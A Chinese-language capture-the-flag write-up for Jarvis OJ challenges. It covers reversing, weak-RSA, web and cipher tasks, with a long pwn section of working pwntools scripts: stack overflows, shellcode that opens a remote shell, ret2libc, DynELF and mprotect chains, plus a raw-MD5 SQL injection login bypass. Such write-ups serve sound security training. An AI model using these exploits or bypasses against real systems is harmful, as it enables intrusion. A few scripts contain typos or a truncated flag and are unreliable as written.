# Jarvis OJ-从打开网站到去世

* #### FindKey

  pyc逆向

  uncompyle得到.py

  ```python
  # uncompyle6 version 3.2.5
  # Python bytecode 2.7 (62211)
  # Decompiled from: Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) 
  # [GCC 7.3.0]
  # Embedded file name: findkey
  # Compiled at: 2016-04-30 17:54:18
  import sys
  lookup = [
   196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]
  pwda = [
   188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]
  pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]
  flag = raw_input('Input your Key:').strip()
  if len(flag) != 17:
      print 'Wrong Key!!'
      sys.exit(1)
  flag = flag[::-1]
  for i in range(0, len(flag)):
      if ord(flag[i]) + pwda[i] & 255 != lookup[i + pwdb[i]]:
          print 'Wrong Key!!'
          sys.exit(1)
  
  print 'Congratulations!!'
  # okay decompiling findkey.pyc
  
  ```

   

  ```python
  lookup = [
   196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]
  pwda = [
   188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]
  pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]
  flag=""
  for i in range(0, 17):
       flag += chr(lookup[i + pwdb[i]]-pwda[i] & 255)
  flag = flag[::-1]
  print flag
  ```

  `PCTF{PyC_Cr4ck3r}`

* #### 软件密码破解-1

  扔到IDA Pro里发现有一堆函数没法看

  扔OD里

  先查找一波看看有没有重要的字符串

  ![1](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/1.png)

  定位到''你赢了''，往上翻可以看到一堆比较，应该是关键函数

  ![2](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/2.png)

  在01021C53断，数据窗口跟随CTF_100_.011977F8

  ![3](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/3.png)

  输入的数据在ebx，eax=ebx

  `ecx=CTF_100.011977F8-ebx=CTF_100_.011977F8-eax=`

  `dl=ecx+eax=CTF_100_.011977F8`

  CTF_100_.011977F8是`x28, 0x57, 0x64, 0x6B, 0x93, 0x8F, 0x65, 0x51, 0xE3, 0x53, 0xE4, 0x4E, 0x1A, 0xFF`

  每次循环将eax中取出一位和CTF_100_.011977F8中的一位异或，然后eax+1，eax可看作下标

  循环结束后比较异或后每一位的值

  异或后的值应为`0x1B, 0x1C, 0x17, 0x46, 0xF4, 0xFD, 0x20, 0x30, 0xB7, 0x0C, 0x8E, 0x7E, 0x78, 0xDE`

  ```python
  a = [0x28, 0x57, 0x64, 0x6B, 0x93, 0x8F, 0x65, 0x51, 0xE3, 0x53, 0xE4, 0x4E, 0x1A, 0xFF]
  b = [0x1B, 0x1C, 0x17, 0x46, 0xF4, 0xFD, 0x20, 0x30, 0xB7, 0x0C, 0x8E, 0x7E, 0x78, 0xDE]
  flag = ""
  for i,j in zip(a,b):
      flag += chr(i ^ j)
  print flag
  ```

  `flag{3Ks-grEaT_j0b!}`

  

* #### [61dctf]stheasy 

  ![4](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/4.png)

  看一下8049AE0和8049B15

  ![5](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/5.png)

  直接写脚本

  ```python
  a = "lk2j9Gh}AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX{CMt8SZo]U"
  b = [0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,0x69,0x7E,0x33,0x15,0x72,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,0x78,0x78,0x78,0x78,0x1b]
  flag = ""
  for i in b:
      flag += a[i/3 - 2]
  print flag
  ```

  `kctf{YoU_hAVe-GOt-fLg_233333}`

  

* #### DD - Hello

   ![6](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/6.png)

  其他函数都没啥用，俺寻思这是关键函数

  v2根据strat和sub_100000C90的地址计算

  ```python
  a = [0x41,0x10,0x11,0x11,0x1B,0x0A,0x64,0x67,0x6A,0x68,0x62,0x68,0x6E,0x67,0x68,0x6B,0x62,0x3D,0x65,0x6A,0x6A,0x3D,0x68,0x4,0x5,0x8,0x3,0x2,0x2,0x55,0x8,0x5D,0x61,0x55,0x0A,0x5F,0x0D,0x5D,0x61,0x32,0x17,0x1D,0x19,0x1F,0x18,0x20,0x4,0x2,0x12,0x16,0x1E,0x54,0x20,0x13,0x14]
  v2 = (0x100000CB0-0x100000C90>>2)^a[0]
  flag = ""
  for i in range(55):
      flag += chr((a[i]-2) ^ v2)
      v2 += 1
  print flag
  ```

  `DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com`

  

* #### [61dctf]admin

   页面上只有一个hello world，抓包也没什么用

  ![7](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/7.png)

  扫一下，发现robot.txt

  内容是`Disallow: /admin_s3cr3t.php`

  进入`admin_s3cr3t.php`，出现`flag{hello guest} `

  假flag，抓包

  ![8](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/8.png)

  把admin=0改成1得到flag

  `flag{hello_admin~}`

  

* #### Login

   ![9](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/9.png)

  改admin没什么用

  发现hint

  ```sql
  select * from `admin` where password='".md5($pass,true)."'
  ```

  `md5('ffifdyop',true)='or'6�]��!r,��b`

  输入`ffifdyop`组成sql语句

  ```sql
  select * from admin where password=''or'6�]��!r,��b'
  ```

  成功绕过

  ![10](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/10.png)

  `PCTF{R4w_md5_is_d4ng3rous} `



* #### Medium RSA 

  题目给了公钥和密文

  ```
  OpenSSL> rsa -pubin -text -modulus -in pubkey.pem
  Public-Key: (256 bit)
  Modulus:
      00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
      1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
      be:30:dd
  Exponent: 65537 (0x10001)
  Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
  writing RSA key
  -----BEGIN PUBLIC KEY-----
  MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
  yigb/+l/vjDdAgMBAAE=
  -----END PUBLIC KEY-----
  ```

  ![11](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/11.png)

  ```
  N = 87924348264132406875276140514499937145050893665602592992418171647042491658461
  E = 65537
  P = 275127860351348928173285174381581152299
  Q = 319576316814478949870590164193048041239
  d = 10866948760844599168252082612378495977388271279679231539839049698621994994673
  ```

  ```
  import math
  import sys
  from Crypto.PublicKey import RSA
  
  keypair = RSA.generate(1024)
  
  keypair.p = 275127860351348928173285174381581152299
  keypair.q = 319576316814478949870590164193048041239
  keypair.e = 65537
  
  keypair.n = keypair.p * keypair.q
  Qn = long((keypair.p-1) * (keypair.q-1))
  
  i = 1
  while (True):
      x = (Qn * i ) + 1
      if (x % keypair.e == 0):
          keypair.d = x / keypair.e
          break
      i += 1
  
  private = open('private.pem','w')
  private.write(keypair.exportKey())
  private.close()
  ```

  得到私钥，解密得到flag

  `PCTF{256b_i5_m3dium`

  

* #### 影之密码 

  密文`8842101220480224404014224202480122 `

  flag是8位大写字母

  有7个0正好分成八段，只有1248四个数字，应该和2^n有点关系

  查了一波和2^n有关系的加密方法，有一种叫做二进制幂数加密法

  任意的十进制数都可以用2^n或2^n+2^m+……的形式表示出来，可表示的单元数=2^(n+1)-1，只要2的0、1、2、3、4次幂就可以表示31个单元。通过用二进制幂数表示字母序号数来加密 

  `23 5 12 12 4 15 14 5`

  `WELLDONE `

  

* #### Tell Me Something 

  ```python
  from pwn import *
  sh = remote("pwn.jarvisoj.com",9876)
  payload = 'a'*136 + p64(0x0000000000400620) 
  sh.recvuntil("message:\n")
  sh.sendline(payload)
  print(sh.recv())
  #PCTF{This_is_J4st_Begin}
  ```

* #### Test Your Memory

   ```python
   from pwn import *
   sh = remote("pwn2.jarvisoj.com",9876)
   elf =ELF("./memory") 
   win_func_addr = elf.symbols['win_func']
   catFlag_addr = 0x080487E0
   padding = 'a' * (0x13 + 0x4)
   payload = padding
   payload += p32(win_func_addr) + p32(0x08048677) + p32(catFlag_addr)
   
   sh.sendline(payload)
   print(sh.recv())
   print(sh.recv())
   #CTF{332e294fb7aeeaf0e1c7703a29304343}
   ```

* #### Smashes 

   ```python
   from pwn import *
   r = remote('pwn.jarvisoj.com',9877)
   flag_addr = 0x400d20
   payload = 'a' * 0x218 + p64(flag_addr)
   #payload = p64(0x400d21) * 1000
   r.sendline(payload)
   r.interactive()
   #PCTF{57dErr_Smasher_good_work!}
   ```

   

* #### [XMAN]level0

  64位文件

  ![12](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/12.png)

  在read处溢出，调用callsystem

  buf大小为0x80，填充buf，覆盖rbp，改vulnerable_function的返回地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9881)
  call = p64(0x400596)
  payload = 'a'*0x88 + call
  r.sendline(payload)
  r.interactive()
  ```

  ![13](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/13.png)

  `CTF{713ca3944e92180e0ef03171981dcd41}`

  

* #### [XMAN]level1

  ![14](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/14.png)

  在read处溢出，前面输出buf的地址

  没有system函数

  ![15](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/15.png)

  没有开启NX，可以用shellcode

  buf的大小为0x88，输入shellcode，填充buf，覆盖ebp，把返回地址改为buf的地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9877)
  context(log_level = 'debug', arch = 'i386', os = 'linux')
  shellcode = asm(shellcraft.sh())
  a = r.recvline()[14: -2]
  buf = int(a,16)
  payload = shellcode + 'a'*(0x88+0x4-len(shellcode)) + p32(buf)
  r.sendline(payload)
  r.interactive()
  
  ```

  ![16](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/16.png)

  `CTF{82c2aa534a9dede9c3a0045d0fec8617}`

  

* #### [XMAN]level2

  在read处溢出，有system函数

  查找有没有/bin/sh

  ![18](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/18.png)

  可以构造system("/bin/sh") 

  填充buf，覆盖ebp，把返回地址改为system的地址，设置system的返回地址，传参给system

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com',9878)
  system =p32(0x8048320)
  binsh = p32(0x804a024)
  payload = 'a'*(0x88+4) + system + p32(0) + binsh
  r.sendline(payload)
  r.interactive()
  #CTF{1759d0cbd854c54ffa886cd9df3a3d52}
  ```

   ![19](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/19.png)

* #### [XMAN]level2(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9882)
   sys_addr = 0x4004C0
   pop_rdi_ret = 0x4006b3
   binsh = 0x600A90
   padding = 'a' * (0x80 + 0x8)
   payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(sys_addr)
   r.sendline(payload)
   r.interacctive()
   #CTF{081ecc7c8d658409eb43358dcc1cf446}
   ```

   

* ####  [XMAN]level3

   ![21](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/21.png)

     开了NX，给出libc，考虑ret2libc

     ![22](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/22.png)

     read处存在溢出

     两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")	

   ```python
     from pwn import *
     
     r = remote("pwn2.jarvisoj.com",9879)
     elf = ELF("./level3")
     libc = ELF("./libc-2.19.so")
     write_plt = elf.plt["write"]
     libc_start_got = elf.got['__libc_start_main']
     func = elf.symbols["vulnerable_function"]
     system_libc = libc.symbols["system"]
     binsh_libc = libc.search("/bin/sh").next()
     libc_start_libc = libc.symbols["__libc_start_main"]
     padding = 'a' * (0x88 + 0x4)
     payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
     r.recvuntil("Input:\n")
     r.sendline(payload1)
     
     leak_addr = u32(r.recv(4))
     libc_base = leak_addr - libc_start_libc
     system_addr = libc_base + system_libc
     binsh_addr = libc_base + binsh_libc
     
     payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
     r.recvuntil("Input:\n")
     r.sendline(payload2)
     r.interactive()
     #CTF{d85346df5770f56f69025bc3f5f1d3d0}
   ```

* #### [XMAN]level3(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9883)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   
   pwn_addr = 0x4005E6
   sys_libc = libc.symbols['system']
   write_libc = libc.symbols['write']
   binsh_libc = libc.search('/bin/sh').next()
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   padding = 'a' * (0x80 + 0x8)
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   #print(hex(leak_addr))
   
   libc_base = leak_addr - write_libc
   binsh = binsh_libc + libc_base
   system = sys_libc + libc_base
   
   payload2 = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   r.interactive()
   #CTF{b1aeaa97fdcc4122533290b73765e4fd}
   ```

   

* #### [XMAN]level4

   ![23](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/23.png)

    ![24](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/24.png)

   栈溢出，ret2libc

   先通过write搞到system地址，没给出libc那就用DynELF

   搞到地址之后再次溢出，先调用read在bss段写入/bin/sh，返回到system执行

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9880)
   elf = ELF('./level4')
   padding = 'a' * (0x88 + 0x4)
   write_addr = elf.plt['write']
   main_addr = elf.symbols['main']
   read_addr = elf.plt['read']
   
   def leak(addr):
   	payload = padding
   	payload += p32(write_addr)
   	payload += p32(main_addr)
   	payload += p32(1) + p32(addr) + p32(4)
   	r.sendline(payload)
   	leak_addr = r.recv(4)
   	return leak_addr
   
   d = DynELF(leak,elf = ELF('./level4'))
   system_addr = d.lookup('system','libc')
   print(hex(system_addr))
   
   bss_addr = elf.bss()
   payload1 = padding
   payload1 += p32(read_addr)
   payload1 += p32(system_addr)
   payload1 += p32(0) + p32(bss_addr) + p32(8)
   payload1 += p32(bss_addr)
   
   r.sendline(payload1)
   r.sendline('/bin/sh\0')
   r.interactive()
   #CTF{882130cf51d65fb705440b218e94e98e}
   ```

   

* #### [XMAN]level5

   假设system和execve函数被禁用 

   ```c
   //mprotect() 
   #include <unistd.h>
   #include <sys/mmap.h>
   int mprotect(const void *start, size_t len, int prot);
   
   /*
   把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
   */
   ```

   先通过write泄露libc，然后调用mprotect()把bss段权限设为可读可写可执行（7），再调用read()在bss段写入shellcode，返回到bss段执行shellcode

   ```python
   from pwn import *
   import sys
   r = remote('pwn2.jarvisoj.com', 9884)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   context.binary = "./level3_x64"
   
   shellcode = asm(shellcraft.sh())
   padding = 'a' * (0x80 + 0x8)
   pwn_addr = 0x4005E6
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   write_libc =  libc.symbols['write']
   
   read_plt = elf.plt['read']
   
   mprotect_libc = libc.symbols['mprotect']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   
   libc_base = leak_addr - write_libc
   mprotect = libc_base + libc.symbols['mprotect']
   pop_rsi = libc_base + 0x24885
   pop_rdx = libc_base + 0x1B8E
   
   
   payload2 = padding + p64(pop_rdi_ret)
   payload2 += p64(0x600000) + p64(pop_rsi)
   payload2 += p64(0x10000) + p64(pop_rdx)
   payload2 += p64(7) + p64(mprotect) + p64(pwn_addr)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   
   bss = elf.bss()
   
   payload3 = padding + p64(pop_rdi_ret)
   payload3 += p64(0) + p64(pop_rsi)
   payload3 += p64(bss) + p64(pop_rdx)
   payload3 += p64(0x100) + p64(read_plt) + p64(bss)
   r.recvuntil('Input:\n')
   r.sendline(payload3)
   r.send(shellcode)
   
   r.interactive()
   
   ```

   

